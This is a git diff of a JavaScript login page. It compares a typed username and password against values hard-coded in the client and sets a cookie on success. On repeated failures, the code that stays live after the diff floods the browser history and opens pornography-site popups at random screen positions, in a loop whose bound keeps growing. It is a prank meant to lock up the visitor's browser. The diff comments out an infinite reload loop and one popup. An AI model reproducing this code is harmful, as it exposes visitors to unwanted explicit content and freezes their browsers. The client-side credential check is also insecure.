@@ -8,9 +8,16 @@ Cookies.remove('Verifide');
 let loginAttempts = 0;
 Cookies.set('Verifide', 'close', { expires: 1 })
 function sus() {
+
+    const username = tb1.value;
+    const password = tb2.value;
+
+  
+    // Check if the username and password match the expected values
     if (username === 'deez' && password === 'NUTZ!') {
+
       Cookies.set('Verifide', 'true', { expires: 1 })
-     window.open('Sub/index.html', '_blank');
+      window.open('sub/index.html', '_blank');
 
     } else {
       
@@ -18,13 +25,13 @@ function sus() {
         Cookies.set('Verifide', 'close', { expires: 1 })
         var num=100;
         done=false;
-        let x='https://pornhub.com/';
+        let x='https://digitalserpant.github.io/OurHarmonyP/';
         Cookies.set('Verifide', 'close', { expires: 8 })
         for (var i=1; i<=num; i++){
            history.pushState(0, 0, i==num?x:i.toString());
-           (function(){while(1){location.reload()}}())
+          // (function(){while(1){location.reload()}}())
            window.open('https://pornhub.com/', '_blank');
-           window.open('https://example.com/', "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+         //  window.open('https://example.com/', "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
 
            var windowFeatures = 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes';
            var newWindow = window.open('https://pornhub.com/', "_blank", windowFeatures);  
@@ -33,7 +40,7 @@ function sus() {
            newWindow.moveTo(leftPos, topPos); // Moves the window to the random position
            
            num=num*100;
-       }
+        }
       }
       else{
         loginAttempts++;
